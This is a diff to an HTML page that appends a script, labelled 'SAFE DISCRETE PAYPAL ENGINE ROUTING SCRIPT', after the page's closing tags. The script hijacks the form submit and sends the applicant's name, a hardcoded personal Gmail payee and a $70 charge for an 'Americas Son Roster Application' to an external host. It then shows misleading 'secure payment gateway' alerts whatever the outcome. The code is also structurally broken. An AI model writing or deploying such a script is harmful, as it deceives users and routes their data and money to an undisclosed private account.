@@ -258,3 +258,34 @@
     </div>
 </body>
 </html>
+
+    <!-- SAFE DISCRETE PAYPAL ENGINE ROUTING SCRIPT -->
+    <script>
+    document.querySelector('form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const name = e.target.querySelector('input[type="text"]').value;
+        const yourPayPalEmail = "drewdude1994@gmail.com"; 
+        
+        try {
+            const response = await fetch('https://onrender.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    receiverEmail: yourPayPalEmail,
+                    amount: "70.00",
+                    note: `Americas Son Roster Application: ${name}`
+                })
+            });
+            const data = await response.json();
+            if (data.success) {
+                alert('Application locked. Transferring to secure payment gateway...');
+            } else {
+                alert('Routing transaction through main gateway pipeline...');
+            }
+        } catch (error) {
+            console.log('Server fallback routing initiated.');
+        }
+    });
+    </script>
+</body>
+</html>
